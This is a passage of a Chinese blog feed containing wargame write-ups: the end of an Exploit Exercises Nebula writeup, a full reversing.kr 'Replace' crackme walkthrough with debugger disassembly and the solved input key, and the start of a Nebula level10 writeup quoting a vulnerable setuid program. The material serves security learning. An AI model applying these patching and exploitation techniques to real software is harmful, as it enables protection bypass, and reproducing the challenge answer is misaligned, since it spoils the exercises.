    &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;//parent&lt;/span&gt;
        &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其中让子进程等待一秒后运行指令，保证父进程退出并让init接管。sh的-c参数用于将输入参数作为指令代替标准输入。&lt;/p&gt;
&lt;p&gt;Voila！全部搞定！&lt;/p&gt;
&lt;h1&gt;后记&lt;/h1&gt;
&lt;p&gt;开始玩Nebula之后无法自拔，天天深陷其中，可能这就是所谓的痴迷吧。&lt;/p&gt;
&lt;p&gt;刚做Nebula的时候觉得真的好简单，以为三四天就能完成，很可惜到后面越做越慢，很多周边知识都是边查边补充，碰到不懂得可能就得完整的系统的学习，用了不少时间，但是非常值得。&lt;/p&gt;
&lt;p&gt;虽然现在20道题都已经完成，但是有些题目的方法还比较局限，待我学会高级的技巧后，会再回来补充一些思路或方案。&lt;/p&gt;
&lt;p&gt;希望这20道题的Writeup能给你帮助。如果你已经完成，那就和我一起进军下一个级别的挑战！&lt;/p&gt;</content><category term="exploit-exercises"></category><category term="nebula"></category><category term="wargame"></category><category term="hacking"></category><category term="exploit"></category></entry><entry><title>reversing.kr Replace Walkthrough</title><link href="http://blog.yyx.me/posts/reversing-kr-replace.html" rel="alternate"></link><published>2014-09-13T20:18:00-07:00</published><updated>2014-09-13T20:18:00-07:00</updated><author><name>YYX</name></author><id>tag:blog.yyx.me,2014-09-13:/posts/reversing-kr-replace.html</id><summary type="html">&lt;p&gt;本文为逆向工程练习网站reversing.kr中Replace解题攻略。&lt;/p&gt;</summary><content type="html">&lt;h1&gt;黑盒实验&lt;/h1&gt;
&lt;p&gt;拿到程序后运行，出现一个包含输入框对话框，不能输入字母和特殊符号，只能输入0-9这10个数字。&lt;/p&gt;
&lt;p&gt;尝试输入数字提交后，程序崩溃。连续实验了几次都一样，包括留空提交。一开始以为是兼容性问题，用兼容模式尝试运行，结果仍然一样。&lt;/p&gt;
&lt;h1&gt;调试和分析&lt;/h1&gt;
&lt;p&gt;首先查壳，拖入PEiD，&lt;code&gt;Microsoft Visual C++ 6.0&lt;/code&gt;，无壳。&lt;/p&gt;
&lt;p&gt;拖入OD，查找Name，根据只能输入数字为线索，找到&lt;code&gt;GetDlgItemInt&lt;/code&gt;，跟到代码，下断。程序跑起来，输入任意数字后单步步过运行，逐渐缩小范围，多次测试后找到使程序崩溃的地方——&lt;code&gt;call Replace.0040466F&lt;/code&gt;，进去看程序代码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0040466F   $  C600 90                     mov byte ptr ds:[eax],0x90
00404672   ?  C3                          retn
00404673   ?  0081 05D08440               add byte ptr ds:[ecx+0x4084D005],al
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这段代码做了一件很好玩的事：把1个byte的0x90填充到ds:[eax]处。ds:[eax]说明这个具体的位置是根据当时eax寄存器的值确定的，0x90如果在数据段就是个不可打印的数据，而在代码段则是&lt;code&gt;NOP&lt;/code&gt;指令。这里的设想一定要大胆，很可能这段话是用来填充代码段的——也就是说，为了“废掉”某个或者某段指令（当然&lt;code&gt;NOP&lt;/code&gt;在Exploit的时候很可能做为模糊跳转技术中的缓冲）。不过目前状态eax的值不在ds指向的范围内，因此造成程序崩溃。&lt;/p&gt;
&lt;p&gt;虽然现在找出了崩溃点，不过貌似没什么作用，我们重新加载程序起来，输入123456，还是断在刚才的地方：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mo"&gt;00401050&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mo"&gt;00&lt;/span&gt;         &lt;span class="n"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x0&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;IsSigned&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;FALSE&lt;/span&gt;
&lt;span class="mo"&gt;00401052&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="mo"&gt;00&lt;/span&gt;         &lt;span class="n"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x0&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;pSuccess&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;
&lt;span class="mo"&gt;00401054&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;68&lt;/span&gt; &lt;span class="n"&gt;EA030000&lt;/span&gt;   &lt;span class="n"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x3EA&lt;/span&gt;                               &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;ControlID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;EA&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;1002.&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="mo"&gt;0040105&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;56&lt;/span&gt;            &lt;span class="n"&gt;push&lt;/span&gt; &lt;span class="n"&gt;esi&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;hWnd&lt;/span&gt;
&lt;span class="mo"&gt;0040105&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="n"&gt;FF15&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="n"&gt;C504000&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt; &lt;span class="n"&gt;dword&lt;/span&gt; &lt;span class="n"&gt;ptr&lt;/span&gt; &lt;span class="nl"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;USER32&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetDlgItemIn&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;GetDlgItemInt&lt;/span&gt;
&lt;span class="mo"&gt;00401060&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="n"&gt;A3&lt;/span&gt; &lt;span class="n"&gt;D0844000&lt;/span&gt;   &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;dword&lt;/span&gt; &lt;span class="n"&gt;ptr&lt;/span&gt; &lt;span class="nl"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:[&lt;/span&gt;&lt;span class="mh"&gt;0x4084D0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;
&lt;span class="mo"&gt;00401065&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="n"&gt;E8&lt;/span&gt; &lt;span class="mo"&gt;05360000&lt;/span&gt;   &lt;span class="n"&gt;call&lt;/span&gt; &lt;span class="n"&gt;Replace&lt;/span&gt;&lt;span class="mf"&gt;.0040466F&lt;/span&gt;
&lt;span class="mo"&gt;0040106&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;33&lt;/span&gt;&lt;span class="n"&gt;C0&lt;/span&gt;          &lt;span class="n"&gt;xor&lt;/span&gt; &lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;
&lt;span class="mo"&gt;0040106&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="n"&gt;E9&lt;/span&gt; &lt;span class="mf"&gt;1F&lt;/span&gt;&lt;span class="mi"&gt;360000&lt;/span&gt;   &lt;span class="n"&gt;jmp&lt;/span&gt; &lt;span class="n"&gt;Replace&lt;/span&gt;&lt;span class="mf"&gt;.00404690&lt;/span&gt;
&lt;span class="mo"&gt;00401071&lt;/span&gt;   &lt;span class="o"&gt;&amp;gt;&lt;/span&gt;  &lt;span class="n"&gt;EB&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;         &lt;span class="n"&gt;jmp&lt;/span&gt; &lt;span class="n"&gt;XReplace&lt;/span&gt;&lt;span class="mf"&gt;.00401084&lt;/span&gt;
&lt;span class="mo"&gt;00401073&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;68&lt;/span&gt; &lt;span class="mi"&gt;34&lt;/span&gt; &lt;span class="mi"&gt;60&lt;/span&gt; &lt;span class="mi"&gt;40&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;ascii&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;h4`@&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;                           &lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="n"&gt;Correct&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;
&lt;span class="mo"&gt;0040107&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;68&lt;/span&gt; &lt;span class="n"&gt;E9030000&lt;/span&gt;   &lt;span class="n"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x3E9&lt;/span&gt;                               &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;ControlID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mf"&gt;3E9&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;1001.&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="mo"&gt;0040107&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="mi"&gt;56&lt;/span&gt;            &lt;span class="n"&gt;push&lt;/span&gt; &lt;span class="n"&gt;esi&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;hWnd&lt;/span&gt;
&lt;span class="mo"&gt;0040107&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="n"&gt;FF15&lt;/span&gt; &lt;span class="n"&gt;A0504000&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt; &lt;span class="n"&gt;dword&lt;/span&gt; &lt;span class="n"&gt;ptr&lt;/span&gt; &lt;span class="nl"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;USER32&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SetDlgItemTe&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;SetDlgItemTextA&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;大致看一下这段代码，获取输入数据后call一次，jmp2次之后就到了Correct提示的地方。这个大致的代码分布记在心中，继续往下分析。&lt;/p&gt;
&lt;p&gt;可以看到在&lt;code&gt;GetDlgItemInt&lt;/code&gt;后把值写到了ds:[0x4084D0]，长度为dword。在数据窗口跳转到这个地址（可以在数据上下内存断点做监控）：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;004084D0  40 E2 01 00 00 00 00 00 00 00 00 00 00 00 00     @?.............
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;发现写入值为01E240（就是16进制的123456）。这里注意几点，第一是存储的顺序为little-endian，第二是因为读入的是int所以长度为dword，第三直接存储了这个数字而没有转化成字符串。&lt;/p&gt;
&lt;p&gt;之后进入一个函数&lt;code&gt;call Replace.0040466F&lt;/code&gt;，跟进去：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0040466F   $  E8 06000000   call Replace.0040467A
00404674      81            db 81
00404675   .  05 D0844000   add eax,Replace.004084D0
0040467A   .  C705 16604000&amp;gt;mov dword ptr ds:[0x406016],0x619060EB
00404684   .  E8 00000000   call Replace.00404689
00404689  /$  FF05 D0844000 inc dword ptr ds:[0x4084D0]
0040468F  \.  C3            retn
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看到&lt;code&gt;0040466F&lt;/code&gt;的函数用call的办法跳转到了&lt;code&gt;0040467A&lt;/code&gt;（call当jmp用），这样反汇编器在反汇编的时候会从&lt;code&gt;0040467A&lt;/code&gt;这个地址开始汇编，而被截断处前面这段机器码由于无法构成一个或几个完整的指令，因此被反汇编成了一个数据（&lt;code&gt;db 81&lt;/code&gt;）+一句指令。之后程序把0x619060EB这个立即数写入ds:[0x406016]，似乎没什么用。之后又通过call来当jmp来用，跳转到下面一句话，刚才在ds:[0x4084D0]保存的值自增1。之后retn又跳回&lt;code&gt;00404689&lt;/code&gt;再执行一遍自增。之后再retn，此时return到了&lt;code&gt;00404674&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;但是&lt;code&gt;00404674&lt;/code&gt;是&lt;code&gt;db 81&lt;/code&gt;啊，不是指令！对，这就是这题最有意思的地方，一段机器码用不同的方式解析，得到不同的运行结果。此时需要让OD重新理解一下这段代码，在&lt;code&gt;00404674&lt;/code&gt;上BackSpace，此时，还是上面那段机器码，但反汇编代码变成了这样：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0040466F   $  E8 06000000   call Replace.0040467A
00404674      8105 D0844000&amp;gt;add dword ptr ds:[0x4084D0],0x601605C7
0040467E   ?  40            inc eax
0040467F   ?  00EB          add bl,ch
00404681   ?  60            pushad
00404682   ?  90            nop
00404683   ?  61            popad
00404684   .  E8 00000000   call Replace.00404689
00404689  /$  FF05 D0844000 inc dword ptr ds:[0x4084D0]
0040468F  \.  C3            retn
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这段代码把ds:[0x4084D0]里面的值加了0x601605C7，之后这些指令似乎没作用，到&lt;code&gt;00404689&lt;/code&gt;完成自增，retn，再自增，然后这个奇怪的函数总算返回了。&lt;/p&gt;
&lt;p&gt;还记得上面说过的两个jmp吗？现在进入第一个jmp：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;00404690   &amp;gt; \A1 D0844000   mov eax,dword ptr ds:[0x4084D0]
00404695   .  68 9F464000   push Replace.0040469F
0040469A   .  E8 EAFFFFFF   call Replace.00404689
0040469F   .  C705 6F464000&amp;gt;mov dword ptr ds:[0x40466F],0xC39000C6
004046A9   .  E8 C1FFFFFF   call Replace.0040466F
004046AE   .  40            inc eax
004046AF   .  E8 BBFFFFFF   call Replace.0040466F
004046B4   .  C705 6F464000&amp;gt;mov dword ptr ds:[0x40466F],0x6E8
004046BE   .  58            pop eax
004046BF   .  B8 FFFFFFFF   mov eax,-0x1
004046C4   .^ E9 A8C9FFFF   jmp Replace.00401071
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;首先取出ds:[0x4084D0]中的值放入eax，之后又跳到前面那个ds:[0x4084D0]自增的地方，自增了1次。接着执行&lt;code&gt;0040469F&lt;/code&gt;，这句指令把0xC39000C6写入ds:[0x40466F]，0x40466F就是前面程序崩溃的地址啊！也就是说，ds:[0x40466F]处是代码（数据段当代码段执行），所以0xC39000C6其实是当做指令来使用的（0xC39000C6就是让程序崩溃的那段程序的机器码），果然之后马上call了0040466F。然后eax增1，再call 0040466F，再把0x6E8放入ds:[0x40466F]（依然是当做指令执行的数据，替换崩溃代码）。之后善后返回到&lt;code&gt;00401071&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这里先不要执行，顺一下思路：此处取出ds:[0x4084D0]中的内容到eax后，执行崩溃函数，然后eax=eax+1，再执行崩溃函数。而前面分析崩溃函数可以用来抹去代码段中一个byte，这里调用两次就是2byte。回去看获取用户输入后的那段代码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;...
00401071   &amp;gt;  EB 11         jmp XReplace.00401084
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这是第二个jmp，两个字节机器码，目前这个jmp返回后就会执行这个&lt;code&gt;00401071&lt;/code&gt;的jmp，而这个jmp把我们原来可以顺序执行到的Correct给绕开了！所以，我们要“废掉”这个jmp。于是乎，回到EIP所在位置，之后把eax改成&lt;code&gt;00401071&lt;/code&gt;（第二个jmp的地址），执行后跳回&lt;code&gt;00401071&lt;/code&gt;，这个时候程序变成了：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mo"&gt;00401071&lt;/span&gt;   &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;90&lt;/span&gt;            &lt;span class="n"&gt;nop&lt;/span&gt;
&lt;span class="mo"&gt;00401072&lt;/span&gt;   &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;90&lt;/span&gt;            &lt;span class="n"&gt;nop&lt;/span&gt;
&lt;span class="mo"&gt;00401073&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;68&lt;/span&gt; &lt;span class="mi"&gt;34&lt;/span&gt; &lt;span class="mi"&gt;60&lt;/span&gt; &lt;span class="mi"&gt;40&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;ascii&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;h4`@&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;                           &lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="n"&gt;Correct&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;
&lt;span class="mo"&gt;0040107&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;68&lt;/span&gt; &lt;span class="n"&gt;E9030000&lt;/span&gt;   &lt;span class="n"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x3E9&lt;/span&gt;                               &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;ControlID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mf"&gt;3E9&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;1001.&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="mo"&gt;0040107&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;            &lt;span class="n"&gt;push&lt;/span&gt; &lt;span class="n"&gt;esi&lt;/span&gt;                                 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;hWnd&lt;/span&gt;
&lt;span class="mo"&gt;0040107&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;FF15&lt;/span&gt; &lt;span class="n"&gt;A0504000&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt; &lt;span class="n"&gt;dword&lt;/span&gt; &lt;span class="n"&gt;ptr&lt;/span&gt; &lt;span class="nl"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:[&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;USER32&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SetDlgItemTe&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;SetDlgItemTextA&lt;/span&gt;
&lt;span class="mo"&gt;004010&lt;/span&gt;&lt;span class="mi"&gt;84&lt;/span&gt;   &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;B8&lt;/span&gt; &lt;span class="mo"&gt;01000000&lt;/span&gt;   &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x1&lt;/span&gt;
&lt;span class="mo"&gt;004010&lt;/span&gt;&lt;span class="mi"&gt;89&lt;/span&gt;   &lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="mi"&gt;90&lt;/span&gt;            &lt;span class="n"&gt;nop&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;第二个可恶的jmp被成功干掉，并顺利执行了Correct！&lt;/p&gt;
&lt;p&gt;到这里就快成功了！下面我们需要做很重要的一步，让程序自己算出正确的eax并完成整个逻辑，最终弹出正确的提示。&lt;/p&gt;
&lt;p&gt;回过头完整整理一下程序流程：获取用户输入 --&amp;gt; 存入ds:[0x4084D0]（命名为a） --&amp;gt; a=a+2 --&amp;gt; a=a+0x601605C7 --&amp;gt; a=a+2 --&amp;gt; a作为目标地址（0x00401071）抹去2个byte --&amp;gt; Done！所以我们需要算出a，a+4+0x601605C7=0x00401071。注意，这里的a的长度是dword，也就是unsigned int。打开calc，算出a为FFFFFFFFA02A0AA6，截取后32bit得到A02A0AA6，转到十进制为2687109798。重新打开程序，输入并获得Correct！&lt;/p&gt;
&lt;h1&gt;总结&lt;/h1&gt;
&lt;p&gt;这题个人感觉还是非常有意思的，不光一段机器码反复利用，还直接把数据当代码解释（可用于动态生成代码执行）。&lt;/p&gt;
&lt;p&gt;这里还有一个细节：为何代码会被反复调用两次。答案很简单，因为利用call当jmp使用还是和直接jmp有区别的，每次call会使得返回地址压栈，因此执行到retn的时候会跳到call之后的语句再执行一遍（这个技巧不知道会不会用于编译器的优化，但是很可能会用于外壳的编写）。&lt;/p&gt;
&lt;p&gt;另外这道题花费时间较长，超过前4个Easy题所用的时间的总和。虽然我写出来的时候逻辑还算是比较简单和清晰的，但实际需要反复调试很多次来理清思路。所以，逆向的Debug是个脑力活，也是体力活T^T。&lt;/p&gt;</content><category term="reversing.kr"></category><category term="wargame"></category><category term="hacking"></category><category term="reversing"></category></entry><entry><title>Exploit Exercises Nebula level10-14 Writeup</title><link href="http://blog.yyx.me/posts/exploit-exercises-nebula-level-10-14.html" rel="alternate"></link><published>2014-09-12T22:14:00-07:00</published><updated>2014-09-12T22:14:00-07:00</updated><author><name>YYX</name></author><id>tag:blog.yyx.me,2014-09-12:/posts/exploit-exercises-nebula-level-10-14.html</id><summary type="html">&lt;p&gt;本文为漏洞利用练习网站exploit-exercises.com中Nebula类型题目第10级到14级的完整攻略。&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Nebula level10&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.&lt;/p&gt;
&lt;p&gt;具有SetUID功能的二进制文件flag10在满足access()系统调用的条件下可以上传任何给定文件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;errno.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;netinet/in.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%s file host&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s"&gt;sends file to host if you have access to it&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
